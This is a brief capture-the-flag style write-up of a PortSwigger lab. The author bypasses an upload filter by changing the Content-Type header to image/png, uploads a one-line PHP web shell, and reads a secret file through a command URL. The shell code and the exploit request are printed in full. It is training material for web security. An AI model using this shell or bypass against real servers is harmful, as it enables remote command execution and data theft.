# Lab: Web Shell Upload via Content-Type Restriction Bypass

**Difficulty:** Apprentice | **Category:** File Upload Vulnerabilities

The goal was to bypass a file type restriction, upload a PHP web shell, and read `/home/carlos/secret`.

Logged in with `wiener:peter` and went to the profile section. Tried uploading the PHP web shell directly:

```php
<?php echo system($_GET['command']); ?>
```

The server rejected it — only `image/jpeg` and `image/png` content types were allowed. Captured the upload request in Burp Suite's HTTP history, sent it to Repeater, and changed the `Content-Type` header from `application/x-php` to `image/png`. Sent the request — server responded with `200 OK`, file uploaded.
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/25c3d901-1160-4233-88f8-9a2ab6fdb0ee" />


Called the shell directly in the browser:

```
https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
```

Server returned the secret — submitted it and the lab was solved.

**Key takeaway:** The server only checked the `Content-Type` header to validate the file type, which is user-controllable. Changing it to `image/png` while keeping the PHP payload intact was enough to bypass the restriction entirely.
